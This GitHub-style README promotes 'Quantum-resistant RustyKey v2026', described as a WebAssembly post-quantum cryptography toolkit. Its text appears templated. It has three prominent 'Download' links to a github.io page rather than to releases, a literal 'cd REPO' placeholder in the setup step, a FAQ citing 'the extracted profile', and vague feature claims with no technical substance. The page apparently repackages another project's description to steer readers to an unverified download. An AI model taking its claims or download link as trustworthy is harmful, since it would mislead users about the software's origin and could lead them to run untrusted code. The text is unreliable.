# Quantum-resistant RustyKey v2026 - post-quantum cryptography toolkit 2026

> **WASM-first post-quantum cryptography toolkit for WebAssembly, WebAuthn, and NIST-aligned workflows, intended for both frontend and backend use in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-WebAssembly-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathan-fisher1994/rustykey-webassembly-crypto?style=flat-square)](https://github.com/nathan-fisher1994/rustykey-webassembly-crypto)

---

<p align="center">
  <a href="https://nathan-fisher1994.github.io/rustykey-webassembly-crypto/">
    <img src="https://img.shields.io/badge/Download-Quantum%20resistant%20RustyKey%20Latest-brightgreen?style=for-the-badge" alt="Download Quantum-resistant RustyKey">
  </a>
</p>

> **[Direct Download - Quantum-resistant RustyKey v2026](https://nathan-fisher1994.github.io/rustykey-webassembly-crypto/)**

---

[Download Latest Build](https://nathan-fisher1994.github.io/rustykey-webassembly-crypto/)

---

## What Quantum-resistant RustyKey is

Quantum-resistant RustyKey is a WebAssembly-oriented toolkit for post-quantum cryptography that can be used in both browser and server-side environments. It is structured around contemporary PQC primitives and delivered through a WASM layer, which makes it a practical choice when one cryptographic implementation needs to serve both frontend and backend code paths.

It is particularly useful for projects that involve WebAuthn and FIDO2-style flows, where payload size and runtime limits can become important. The package also ships with a live playground and testbed so you can observe behavior, validate ideas, and try the included algorithms before embedding them into an application.

---

## Capabilities

- WebAssembly-based implementations of post-quantum cryptography tooling
- Usable in Node backends and in frontend web apps
- Includes ML-DSA, FN-DSA, ML-KEM, and SQISign support
- Produced from upstream C/C++ sources via Emscripten
- Appropriate for WebAuthn and FIDO2 use cases with strict signature-size limits
- Ships with a playground for hands-on testing
- Provides a live testbed for experimentation and verification
- Focused on NIST and NIST on-ramp PQC workflows

---

## Getting started

Clone the repository and install whatever dependencies your build or runtime setup requires:

```bash
git clone https://github.com/nathan-fisher1994/rustykey-webassembly-crypto.git
cd REPO
```

For web usage, either open the hosted project or serve the compiled artifacts locally. For Node-based usage, import the generated module from your application entry point after the build step has created the WASM bundle.

---

## How to use it

The exact flow depends on whether RustyKey is being embedded in a browser application or called from Node.

Example workflow:

1. Build or load the WASM bundle.
2. Import the module into your frontend or backend project.
3. Pick the PQC primitive you want to exercise, such as ML-DSA, ML-KEM, FN-DSA, or SQISign.
4. Perform signing, key exchange, or verification tasks through the playground or your own code.
5. Check the results against your integration requirements, with special attention to WebAuthn-related size limits.

If you begin with the live testbed, use the interactive interface first. Once the behavior matches expectations, apply the same flow inside your application code.

---

## Configuration notes

Configuration is generally handled in the build layer and in application integration rather than through a large end-user settings file. In practice, that usually means:

- choosing the target runtime: browser or Node
- enabling the algorithm set you need
- adjusting WebAuthn and FIDO2-related limits in your integration
- defining any module paths needed to load the WASM artifact

If you wrap the toolkit inside a custom application, keep environment-specific values in your app configuration and leave the toolkit focused on cryptographic behavior and runtime integration.

---

## Requirements

- A WebAssembly-capable runtime
- A browser environment for frontend usage, or Node for backend usage
- An Emscripten-compatible build pipeline for upstream C/C++ sources
- Enough storage for compiled WASM assets and related files
- A modern browser or a current Node version that fits your integration target

---

## FAQ

### Does it work in both frontend and backend projects?
Yes. The toolkit is meant for browser-based interfaces as well as Node-driven backend workflows.

### Which algorithms are available?
The extracted profile includes ML-DSA, FN-DSA, ML-KEM, and SQISign.

### Is there a way to try it before integrating it?
Yes. A playground and live testbed are included for experimentation.

### Can it be used for WebAuthn work?
It is built with constrained WebAuthn and FIDO2 signature sizes in mind, so it fits that class of integration well.

### Where can I get updates?
Use the download link above for the latest build and watch the repository for release changes.

### What should I check if something fails to load?
Confirm your WASM runtime, build output paths, and whether your browser or Node environment matches the bundle you are trying to run.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
